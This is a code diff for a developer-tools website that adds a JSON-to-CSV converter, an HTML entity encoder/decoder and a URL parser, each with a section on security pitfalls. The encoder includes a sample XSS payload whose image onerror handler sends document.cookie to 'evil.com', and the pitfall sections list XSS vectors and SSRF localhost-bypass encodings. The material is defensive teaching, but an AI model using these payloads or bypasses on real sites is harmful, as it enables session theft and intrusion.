+                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. Heterogeneous JSON Key Skew in NoSQL Datasets</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  In document databases (MongoDB, DynamoDB), JSON records are schema-less. Naively inspecting only the first object (<code>Object.keys(data[0])</code>) discards columns that appear exclusively in later records or shifts cell data into incorrect columns. A robust converter must scan all objects to compile an exhaustive master header set.
+                </p>
+              </div>
             </div>
           </div>
         </div>
+
         <script>
-          function jsonToCsv() {
-            try {
-              const data = JSON.parse(document.getElementById('j2c-in').value);
-              if (!Array.isArray(data) || data.length === 0) return;
-              const headers = Object.keys(data[0]);
-              const rows = [headers.join(',')];
-              data.forEach(obj => {
-                rows.push(headers.map(h => JSON.stringify(obj[h] ?? '')).join(','));
-              });
-              document.getElementById('j2c-out').value = rows.join('\n');
-            } catch(e) { document.getElementById('j2c-out').value = 'Error: ' + e.message; }
+          function formatCsvCell(val, delim) {
+            if (val === null || val === undefined) return '';
+            var str = typeof val === 'object' ? JSON.stringify(val) : String(val);
+            var needsQuotes = str.indexOf(delim) !== -1 || str.indexOf('"') !== -1 || str.indexOf('\n') !== -1 || str.indexOf('\r') !== -1;
+            if (needsQuotes) {
+              str = '"' + str.replace(/"/g, '""') + '"';
+            }
+            return str;
           }
+
+          window.jsonToCsv = function() {
+            var raw = (document.getElementById('j2c-in') ? document.getElementById('j2c-in').value : '').trim();
+            var outEl = document.getElementById('j2c-out');
+            var metricsEl = document.getElementById('csvMetrics');
+            var delim = document.getElementById('csv-delim') ? document.getElementById('csv-delim').value : ',';
+            var incHeaders = document.getElementById('csv-headers') ? document.getElementById('csv-headers').checked : true;
+
+            if (!raw) {
+              outEl.value = '';
+              metricsEl.textContent = '0 rows';
+              return;
+            }
+
+            try {
+              var data = JSON.parse(raw);
+              if (!Array.isArray(data)) {
+                if (typeof data === 'object' && data !== null) data = [data];
+                else throw new Error('Input must be a JSON array of objects');
+              }
+              if (data.length === 0) {
+                outEl.value = '';
+                metricsEl.textContent = '0 rows';
+                return;
+              }
+
+              // Build exhaustive header set from all records
+              var headerMap = {};
+              data.forEach(function(item) {
+                if (item && typeof item === 'object') {
+                  Object.keys(item).forEach(function(k) { headerMap[k] = true; });
+                }
+              });
+              var headers = Object.keys(headerMap);
+
+              var rows = [];
+              if (incHeaders) {
+                rows.push(headers.map(function(h) { return formatCsvCell(h, delim); }).join(delim));
+              }
+
+              data.forEach(function(item) {
+                if (!item || typeof item !== 'object') return;
+                var row = headers.map(function(h) {
+                  return formatCsvCell(item[h], delim);
+                });
+                rows.push(row.join(delim));
+              });
+
+              var csv = rows.join('\n');
+              outEl.value = csv;
+              metricsEl.textContent = data.length + ' rows, ' + headers.length + ' columns';
+            } catch(e) {
+              outEl.value = 'Error: ' + e.message;
+              metricsEl.textContent = 'Error';
+            }
+          };
+
+          window.loadSampleJson = function() {
+            var sample = [
+              { "id": 101, "name": "Alice Cooper", "department": "Security", "email": "alice@company.com", "salary": 125000, "verified": true },
+              { "id": 102, "name": "Bob Martin", "department": "Engineering", "email": "bob@company.com", "salary": 140000, "verified": true },
+              { "id": 103, "name": "Charlie, Brown", "department": "Design", "email": "charlie@company.com", "salary": 95000, "verified": false },
+              { "id": 104, "name": "Diana Prince", "department": "Product", "email": "diana@company.com", "salary": 155000, "verified": true }
+            ];
+            document.getElementById('j2c-in').value = JSON.stringify(sample, null, 2);
+            jsonToCsv();
+          };
+
+          window.copyCsv = function() {
+            var csv = document.getElementById('j2c-out') ? document.getElementById('j2c-out').value : '';
+            if (!csv) { jsonToCsv(); csv = document.getElementById('j2c-out').value; }
+
+            navigator.clipboard.writeText(csv).then(function() {
+              var btn = document.getElementById('btnCopyCsv');
+              if (btn) {
+                var orig = btn.innerHTML;
+                btn.innerHTML = '<span style="color:#10b981;">✓ CSV Copied to Clipboard!</span>';
+                btn.style.borderColor = '#10b981';
+                setTimeout(function() {
+                  btn.innerHTML = orig;
+                  btn.style.borderColor = 'var(--border)';
+                }, 2200);
+              }
+            });
+          };
+
+          window.downloadCsvFile = function() {
+            var csv = document.getElementById('j2c-out') ? document.getElementById('j2c-out').value : '';
+            if (!csv) { jsonToCsv(); csv = document.getElementById('j2c-out').value; }
+            if (!csv || csv.startsWith('Error:')) return;
+
+            var useBom = document.getElementById('csv-bom') ? document.getElementById('csv-bom').checked : true;
+            var blobContent = useBom ? ['\uFEFF', csv] : [csv];
+            var blob = new Blob(blobContent, { type: 'text/csv;charset=utf-8;' });
+            var url = URL.createObjectURL(blob);
+            var a = document.createElement('a');
+            a.href = url;
+            a.download = 'export_' + Date.now() + '.csv';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+          };
+
+          document.addEventListener('DOMContentLoaded', function() {
+            var inp = document.getElementById('j2c-in');
+            if (inp && inp.value) jsonToCsv();
+          });
         </script>
       `
     },
@@ -954,19 +1419,167 @@ export function buildDevToolsSuite({ DIST, DOMAIN, renderPage, writeFileSync, jo
       category: 'Developer',
       body: `
         ${commonStyle}
-        <div class="article-container" style="max-width: 900px;">
+        <div class="article-container" style="max-width: 920px;">
           <nav style="font-family: var(--mono); font-size: 0.8rem; margin-bottom: 1.5rem; color: var(--text-muted);">
             <a href="/">Home</a> &gt; <a href="/dev/">Developer Tools</a> &gt; HTML Entity Encoder
           </nav>
-          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">HTML Entity Encoder & Decoder</h1>
+          <h1 style="font-family: var(--serif); font-size: 1.8rem; margin-bottom: 0.5rem;">HTML Entity Encoder &amp; Decoder Studio</h1>
+          <p style="color: var(--text-muted); font-size: 0.95rem; line-height: 1.5; margin-bottom: 1.5rem;">
+            Convert reserved HTML characters, symbols, and Unicode strings into named, decimal, or hexadecimal entities and decode them safely.
+          </p>
+
           <div class="tool-box">
-            <textarea id="ent-in" class="code-input" style="height: 120px;" placeholder="<div class=&quot;box&quot;>Hello & welcome!</div>"></textarea>
-            <div class="action-bar">
-              <button class="btn-primary" onclick="document.getElementById('ent-in').value=document.getElementById('ent-in').value.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/\"/g,'&quot;').replace(/'/g,'&#39;')">Encode Entities</button>
-              <button class="btn-sec" onclick="const ta=document.createElement('textarea'); ta.innerHTML=document.getElementById('ent-in').value; document.getElementById('ent-in').value=ta.value;">Decode Entities</button>
+            <div class="field-group">
+              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.35rem;">
+                <label class="field-label" style="margin: 0;">Input Text or HTML</label>
+                <button type="button" class="btn-sec" style="font-size: 0.72rem; padding: 0.2rem 0.5rem;" onclick="loadXssPayloadSample()">Load XSS Payload Sample</button>
+              </div>
+              <textarea id="ent-in" class="code-input" style="height: 120px;" placeholder='<div class="banner">Hello &amp; welcome to "Digital Tools Shed" &lt;2026&gt;!</div>'></textarea>
+            </div>
+
+            <!-- Mode Selector Bar -->
+            <div style="display: flex; gap: 0.5rem; flex-wrap: wrap; margin: 1rem 0;">
+              <button type="button" class="btn-primary" onclick="entityTransform('named')">Encode Named Entities (&amp;amp; &amp;lt;)</button>
+              <button type="button" class="btn-sec" onclick="entityTransform('decimal')">Encode Decimal (&#38;)</button>
+              <button type="button" class="btn-sec" onclick="entityTransform('hex')">Encode Hexadecimal (&#x26;)</button>
+              <button type="button" class="btn-sec" onclick="entityTransform('decode')">Decode Entities to Text</button>
+              <button type="button" class="btn-sec" onclick="clearEntityInputs()">Clear</button>
+            </div>
+
+            <div class="field-group" style="margin-top: 1.25rem;">
+              <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.35rem;">
+                <label class="field-label" style="margin: 0;">Output Result</label>
+                <span id="entMetrics" style="font-family: var(--mono); font-size: 0.75rem; color: var(--text-muted);">0 chars</span>
+              </div>
+              <textarea id="ent-out" class="code-input" style="height: 120px;" readonly></textarea>
+            </div>
+
+            <!-- Copy Button -->
+            <button type="button" id="btnCopyHtmlEntities" onclick="copyHtmlEntities()" class="btn-sec" style="margin-top: 1.25rem; width: 100%; padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
+              <span>📋 Copy Encoded / Decoded HTML Entities</span>
+            </button>
+          </div>
+
+          <!-- 5 Critical HTML Entity & Sanitization Traps -->
+          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
+            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in HTML Entities &amp; XSS Defense Architecture</h3>
+            <div style="display: grid; gap: 1rem;">
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. The Incomplete 5-Character Sanitization Fallacy</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  Escaping only the five canonical characters (<code>&amp; &lt; &gt; " '</code>) is insufficient to prevent Cross-Site Scripting (XSS) inside unquoted HTML attributes or JavaScript event handlers. Inside an unquoted attribute (<code>&lt;input value=\${input}&gt;</code>), an attacker does not need quotes or angle brackets; a simple space or tab followed by <code>onfocus=alert(1) autofocus</code> achieves full script execution.
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. Double-Encoding Cascades (&amp;amp;amp; Pollution)</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  When user input is encoded during database storage and subsequently re-encoded during template rendering, ampersands compound exponentially: <code>&amp;copy;</code> becomes <code>&amp;amp;copy;</code>, displaying literal <code>&amp;copy;</code> code on screen instead of the copyright symbol. Applications should store unescaped canonical strings in the database and apply entity encoding exclusively at the final view rendering boundary.
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. Context Ineffectiveness in 'href' &amp; 'src' URI Attributes</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  HTML entity encoding does NOT sanitize URLs. If an attacker inputs <code>javascript:alert(document.cookie)</code> and you entity-encode it as <code>&lt;a link-url="&amp;#106;avascript:alert(1)"&gt;</code>, modern web browsers decode the HTML entities inside URI attributes BEFORE executing the link, resulting in instant XSS. URIs require strict protocol whitelisting (<code>http://</code>, <code>https://</code>).
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. DOM-Based XSS via 'innerHTML' Entity Decoding</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  A pervasive JavaScript antipattern decodes HTML entities by creating an off-screen element and setting <code>el.innerHTML = input</code> followed by reading <code>el.textContent</code>. If the input contains <code>&lt;img src=x onerror=alert(1)&gt;</code>, setting <code>innerHTML</code> immediately fires the <code>onerror</code> event in browser memory before the element is even attached to the DOM.
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. XML / SVG Parser Abort on HTML Named Entities</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  While HTML5 recognizes over 2,000 named entities (e.g. <code>&amp;nbsp;</code>, <code>&amp;euro;</code>, <code>&amp;mdash;</code>), strict XML, XHTML, and SVG engines only natively recognize five: <code>&amp;quot; &amp;amp; &amp;apos; &amp;lt; &amp;gt;</code>. Injecting <code>&amp;nbsp;</code> into an SVG or RSS feed causes XML parsers to abort with fatal <code>entity not defined</code> parsing errors.
+                </p>
+              </div>
             </div>
           </div>
         </div>
+
+        <script>
+          var entityMap = {
+            '&': '&amp;',
+            '<': '&lt;',
+            '>': '&gt;',
+            '"': '&quot;',
+            "'": '&#39;',
+            '\x60': '&#96;'
+          };
+
+          window.entityTransform = function(mode) {
+            var raw = (document.getElementById('ent-in') ? document.getElementById('ent-in').value : '');
+            var out = '';
+
+            if (mode === 'named') {
+              out = raw.replace(/[&<>"'\x60]/g, function(s) { return entityMap[s] || s; });
+            } else if (mode === 'decimal') {
+              out = raw.replace(/[\s\S]/g, function(ch) {
+                var code = ch.charCodeAt(0);
+                return (code < 32 || code > 126 || /[&<>"'\x60]/.test(ch)) ? '&#' + code + ';' : ch;
+              });
+            } else if (mode === 'hex') {
+              out = raw.replace(/[\s\S]/g, function(ch) {
+                var code = ch.charCodeAt(0);
+                return (code < 32 || code > 126 || /[&<>"'\x60]/.test(ch)) ? '&#x' + code.toString(16).toUpperCase() + ';' : ch;
+              });
+            } else if (mode === 'decode') {
+              // Safe entity decoding using DOMParser to prevent code execution
+              try {
+                var doc = new DOMParser().parseFromString('<!doctype html><body>' + raw, 'text/html');
+                out = doc.body.textContent || '';
+              } catch(e) {
+                out = raw.replace(/&amp;/g, '&').replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&quot;/g, '"').replace(/&#39;/g, "'");
+              }
+            }
+
+            document.getElementById('ent-out').value = out;
+            document.getElementById('entMetrics').textContent = out.length + ' chars';
+          };
+
+          window.clearEntityInputs = function() {
+            document.getElementById('ent-in').value = '';
+            document.getElementById('ent-out').value = '';
+            document.getElementById('entMetrics').textContent = '0 chars';
+          };
+
+          window.loadXssPayloadSample = function() {
+            var payload = '<div class="profile" data-user="admin\"><script>alert(document.domain)<\/script>\n<a href="javascript:alert(1)" onclick="stealCookies()">Click Me & Win $1,000!</a>\n<img src="x" onerror="fetch(\'https://evil.com/leak?\'+document.cookie)">';
+            document.getElementById('ent-in').value = payload;
+            entityTransform('named');
+          };
+
+          window.copyHtmlEntities = function() {
+            var out = document.getElementById('ent-out') ? document.getElementById('ent-out').value : '';
+            if (!out) {
+              entityTransform('named');
+              out = document.getElementById('ent-out').value;
+            }
+
+            navigator.clipboard.writeText(out).then(function() {
+              var btn = document.getElementById('btnCopyHtmlEntities');
+              if (btn) {
+                var orig = btn.innerHTML;
+                btn.innerHTML = '<span style="color:#10b981;">✓ HTML Entities Copied!</span>';
+                btn.style.borderColor = '#10b981';
+                setTimeout(function() {
+                  btn.innerHTML = orig;
+                  btn.style.borderColor = 'var(--border)';
+                }, 2200);
+              }
+            });
+          };
+
+          document.addEventListener('DOMContentLoaded', function() {
+            var inp = document.getElementById('ent-in');
+            if (inp && inp.value) entityTransform('named');
+          });
+        </script>
       `
     },
     {
@@ -1390,8 +2003,54 @@ export function buildDevToolsSuite({ DIST, DOMAIN, renderPage, writeFileSync, jo
               </div>
             </div>
 
-            <div class="action-bar" style="margin-top: 1.5rem;">
-              <button class="btn-primary" onclick="copyParsedJson()">Copy All as JSON</button>
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 0.75rem; margin-top: 1.5rem;">
+              <button type="button" id="btnCopyUrlReport" onclick="copyUrlReport()" class="btn-sec" style="padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
+                <span>📋 Copy Complete URL Breakdown</span>
+              </button>
+              <button type="button" id="btnCopyParamsJson" onclick="copyParamsJson()" class="btn-sec" style="padding: 0.65rem 1rem; font-family: var(--mono); font-size: 0.82rem; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 0.5rem; background: var(--surface); border: 1px solid var(--border); border-radius: 6px; color: var(--fg); font-weight: 600;">
+                <span>📦 Copy Query Params as JSON</span>
+              </button>
+            </div>
+          </div>
+
+          <!-- 5 Critical URL Architecture Traps -->
+          <div style="background: var(--surface); border: 1px solid var(--border); padding: 1.5rem; border-radius: 8px; margin: 2rem 0;">
+            <h3 style="font-family: var(--serif); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--fg);">⚠️ 5 Fatal Traps in URL Parsing &amp; Request Routing Architecture</h3>
+            <div style="display: grid; gap: 1rem;">
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #ef4444;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #ef4444; font-size: 1rem; font-family: var(--serif);">💥 1. SSRF via Ambiguous Host Parsing (Decimal &amp; Octal IPs)</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  Naive URL parser regexes that block <code>127.0.0.1</code> or <code>localhost</code> are trivially bypassed by alternate IP encodings. For instance, decimal <code>2130706433</code>, octal <code>0177.0.0.1</code>, hex <code>0x7f.0.0.1</code>, or IPv6 bracket notation <code>[::1]</code> all resolve to localhost in operating system network stacks, allowing attackers to access internal cloud metadata services (e.g. AWS <code>169.254.169.254</code>).
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #f59e0b;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #f59e0b; font-size: 1rem; font-family: var(--serif);">⚖️ 2. Protocol Confusion with Scheme-Relative URLs (//evil.com)</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  A URL starting with <code>//evil.com</code> lacks an explicit protocol scheme. Backend validation checks (e.g. <code>url.startsWith('/')</code>) mistakenly classify it as a safe relative internal route, but web browsers resolve it as a network-path reference that inherits the current page protocol, executing an unauthorized external redirect.
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #10b981;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #10b981; font-size: 1rem; font-family: var(--serif);">🛡️ 3. HTTP Parameter Pollution (HPP) Across Different Frameworks</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  When duplicate query parameters appear (e.g. <code>?role=user&amp;role=admin</code>), different backend web frameworks parse them inconsistently: Node.js Express creates an array (<code>['user','admin']</code>), PHP takes the last occurrence (<code>admin</code>), and ASP.NET joins them with commas (<code>user,admin</code>). This behavior divergence allows attackers to bypass Web Application Firewalls (WAFs).
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #3b82f6;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #3b82f6; font-size: 1rem; font-family: var(--serif);">🔍 4. The Client-Only Fragment Hash Isolation Boundary</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  The URL fragment identifier (anything after the <code>#</code> character) is strictly client-side; web browsers NEVER include it in HTTP request packets sent to servers. Authentication flows or webhook handlers that mistakenly place session tokens after the hash symbol fail completely on server-side APIs unless extracted by client-side JavaScript.
+                </p>
+              </div>
+
+              <div style="padding: 1.25rem; background: var(--surface-alt); border-radius: 8px; border: 1px solid var(--border); border-left: 4px solid #8b5cf6;">
+                <h4 style="margin: 0 0 0.5rem 0; color: #8b5cf6; font-size: 1rem; font-family: var(--serif);">🚀 5. Userinfo Impersonation &amp; Credential Splitting (@ Symbol)</h4>
+                <p style="font-size: 0.88rem; color: var(--text-muted); margin: 0; line-height: 1.6;">
+                  RFC 3986 allows user authentication strings before an <code>@</code> character: <code>https://trusted.bank.com@evil-site.com/</code>. Visual users and naive substring parsers see <code>trusted.bank.com</code> and trust the link, while the actual connection connects to <code>evil-site.com</code> with username credentials. Modern browsers deprecate userinfo, but automated crawlers and microservices remain vulnerable.
+                </p>
+              </div>
             </div>
           </div>
         </div>
@@ -1404,7 +2063,7 @@ export function buildDevToolsSuite({ DIST, DOMAIN, renderPage, writeFileSync, jo
             if (!raw) return;
 
             try {
-              var u = new URL(raw.match(/^[a-zA-Z]+:\\/\\//) ? raw : 'https://' + raw);
+              var u = new URL(raw.match(/^[a-zA-Z]+:\/\//) ? raw : 'https://' + raw);
               document.getElementById('u-protocol').textContent = u.protocol;
               document.getElementById('u-hostname').textContent = u.hostname;
               document.getElementById('u-port').textContent = u.port || '(default ' + (u.protocol === 'https:' ? '443' : '80') + ')';
@@ -1413,8 +2072,8 @@ export function buildDevToolsSuite({ DIST, DOMAIN, renderPage, writeFileSync, jo
 
               var segments = u.pathname.split('/').filter(Boolean);
               document.getElementById('u-segments').innerHTML = segments.map(function(s, idx) {
-                return '<span style=\"background:var(--surface-alt); border:1px solid var(--border); padding:0.2rem 0.5rem; border-radius:3px; font-family:var(--mono); font-size:0.75rem;\">[' + idx + '] ' + s + '</span>';
-              }).join('') || '<span style=\"font-size:0.8rem; color:var(--text-muted);\">No sub-paths</span>';
+                return '<span style="background:var(--surface-alt); border:1px solid var(--border); padding:0.2rem 0.5rem; border-radius:3px; font-family:var(--mono); font-size:0.75rem;">[' + idx + '] ' + s + '</span>';
+              }).join('') || '<span style="font-size:0.8rem; color:var(--text-muted);">No sub-paths</span>';
 
               var tbody = document.getElementById('paramsRows');
               tbody.innerHTML = '';
@@ -1427,15 +2086,15 @@ export function buildDevToolsSuite({ DIST, DOMAIN, renderPage, writeFileSync, jo
                 var tr = document.createElement('tr');
                 tr.style.borderBottom = '1px solid var(--border)';
                 tr.innerHTML = 
-                  '<td style=\"padding:0.5rem; font-weight:bold; color:var(--fg);\">' + escapeHtml(key) + '</td>' +
-                  '<td style=\"padding:0.5rem; color:#22c55e;\">' + escapeHtml(val) + '</td>' +
-                  '<td style=\"padding:0.5rem;\"><button class=\"btn-sec\" style=\"font-size:0.7rem; padding:0.2rem 0.4rem;\" onclick=\"copyText(\\'' + escapeHtml(val).replace(/'/g, \"\\\\'\") + '\\')\">Copy</button></td>';
+                  '<td style="padding:0.5rem; font-weight:bold; color:var(--fg);">' + escapeHtml(key) + '</td>' +
+                  '<td style="padding:0.5rem; color:#22c55e;">' + escapeHtml(val) + '</td>' +
+                  '<td style="padding:0.5rem;"><button class="btn-sec" style="font-size:0.7rem; padding:0.2rem 0.4rem;" onclick="copyParamVal(\'' + escapeHtml(val).replace(/'/g, "\\'") + '\')">Copy</button></td>';
                 tbody.appendChild(tr);
               });
 
               document.getElementById('param-count').textContent = count;
               if (count === 0) {
-                tbody.innerHTML = '<tr><td colspan=\"3\" style=\"padding:0.75rem; text-align:center; color:var(--text-muted); font-size:0.85rem;\">No query parameters found</td></tr>';
+                tbody.innerHTML = '<tr><td colspan="3" style="padding:0.75rem; text-align:center; color:var(--text-muted); font-size:0.85rem;">No query parameters found</td></tr>';
               }
 
               parsedObj = {
@@ -1443,7 +2102,7 @@ export function buildDevToolsSuite({ DIST, DOMAIN, renderPage, writeFileSync, jo
                 protocol: u.protocol,
                 origin: u.origin,
                 hostname: u.hostname,
-                port: u.port,
+                port: u.port || (u.protocol === 'https:' ? '443' : '80'),
                 pathname: u.pathname,
                 pathSegments: segments,
                 queryParams: qObj,
@@ -1455,24 +2114,58 @@ export function buildDevToolsSuite({ DIST, DOMAIN, renderPage, writeFileSync, jo
           }
 
           function escapeHtml(str) {
-            return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/\"/g, '&quot;');
+            return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
           }
 
-          function copyText(val) {
+          window.copyParamVal = function(val) {
             navigator.clipboard.writeText(val);
-          }
+          };
 
-          function copyParamsJson() {
-            if (parsedObj.queryParams) {
-              navigator.clipboard.writeText(JSON.stringify(parsedObj.queryParams, null, 2));
-              alert('Copied query params as JSON!');
-            }
-          }
+          window.copyParamsJson = function() {
+            var q = parsedObj.queryParams || {};
+            var json = JSON.stringify(q, null, 2);
+            navigator.clipboard.writeText(json).then(function() {
+              var btn = document.getElementById('btnCopyParamsJson');
+              if (btn) {
+                var orig = btn.innerHTML;
+                btn.innerHTML = '<span style="color:#10b981;">✓ Query JSON Copied!</span>';
+                btn.style.borderColor = '#10b981';
+                setTimeout(function() {
+                  btn.innerHTML = orig;
+                  btn.style.borderColor = 'var(--border)';
+                }, 2200);
+              }
+            });
+          };
 
-          function copyParsedJson() {
-            navigator.clipboard.writeText(JSON.stringify(parsedObj, null, 2));
-            alert('Copied parsed URL breakdown as JSON!');
-          }
+          window.copyUrlReport = function() {
+            if (!parsedObj.href) parseUrl();
+            var p = parsedObj;
+            var text = '🌐 Comprehensive URL Architecture Breakdown\n' +
+              '• Full URL: ' + (p.href || '') + '\n' +
+              '• Origin: ' + (p.origin || '') + '\n' +
+              '• Protocol: ' + (p.protocol || '') + '\n' +
+              '• Hostname: ' + (p.hostname || '') + '\n' +
+              '• Port: ' + (p.port || '') + '\n' +
+              '• Pathname: ' + (p.pathname || '') + '\n' +
+              '• Path Segments: ' + JSON.stringify(p.pathSegments || []) + '\n' +
+              '• Query Params (' + Object.keys(p.queryParams || {}).length + '): ' + JSON.stringify(p.queryParams || {}) + '\n' +
+              '• Hash / Fragment: ' + (p.hash || '(none)') + '\n\n' +
+              'Parsed at digitaltoolsshed.com/dev/url-parser';
+
+            navigator.clipboard.writeText(text).then(function() {
+              var btn = document.getElementById('btnCopyUrlReport');
+              if (btn) {
+                var orig = btn.innerHTML;
+                btn.innerHTML = '<span style="color:#10b981;">✓ URL Report Copied!</span>';
+                btn.style.borderColor = '#10b981';
+                setTimeout(function() {
+                  btn.innerHTML = orig;
+                  btn.style.borderColor = 'var(--border)';
+                }, 2200);
+              }
+            });
+          };
 
           document.addEventListener('DOMContentLoaded', parseUrl);
           parseUrl();
